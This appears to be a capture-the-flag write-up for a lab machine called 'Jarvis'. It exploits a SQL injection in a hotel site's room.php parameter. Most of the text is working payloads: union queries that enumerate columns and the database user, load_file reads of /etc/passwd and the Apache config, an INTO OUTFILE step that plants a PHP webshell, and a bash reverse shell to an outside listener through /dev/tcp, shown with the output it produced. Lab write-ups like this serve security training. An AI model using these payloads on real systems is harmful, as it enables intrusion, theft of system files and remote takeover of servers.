# SQL Injection PoC

#### Union Attacks until RCE PoC

```
/room.php?cod=1'-- -
```
```
/room.php?cod=1 order by 1
```

increment it by 1 until it breaks the query again --> the last iteration where 
the query still returns provides u with how many columns are being queried by the default sql query of the application

Use union based queries in order to find the injectable columns.

```
/room.php?cod=0 union select 1,2,3,4,5,6,7
```

2,3,4 & 5 are injectable.

Let's enumerate which db & user is running on the query.

```
/room.php?cod=0 union select 1,database(),user(),4,5,6,7
```

##### Writable Directory

There is an sql function which allows us to view files called load_file()

```
/room.php?cod=0 union select 1,load_file('/etc/passwd'),3,4,5,6,7
```

Now that we know that we can view files using the load_file function, let's enumerate where the webroot is stored in the apache2 server

/etc/apache2/sites-enabled/000-default.conf usually displays where the webroot is specified. So let's view this file.

```
/room.php?cod=0 union select 1,load_file('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7
```

Loading files of /etc/passwd in an file on webroot directory (var/www/html)

```
/room.php?cod=0 union select 1,load_file('/etc/passwd'),3,4,5,6,7
```

There is an functionality in MySQL called INTO OUTFILE which allows us to outfile the content into an different file which were loaded by load_file.

```
/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'
```


It worked, we can write in /var/www/html, now we can utilize creating an webshell in order to get foothold of the target server.

```
/room.php?cod=1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
```

We get the following output when sending an POST request to /pwned.php, which means the exec parameter we created actually works. We can now execute commands on the server.

```
curl -X POST http://supersecurehotel.htb/pwned.php --data-urlencode exec=whoami
1       www-data
        3       4       5       6       7
```

Embedded my rev shell script into exec parameter and started up my listener using netcat on port 1337.

```
curl -X POST http://supersecurehotel.htb/pwned.php --data-urlencode 'exec=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.186/1337 0>&1"'
```
```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.137] 33880
bash: cannot set terminal process group (608): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jarvis:/var/www/html$
```


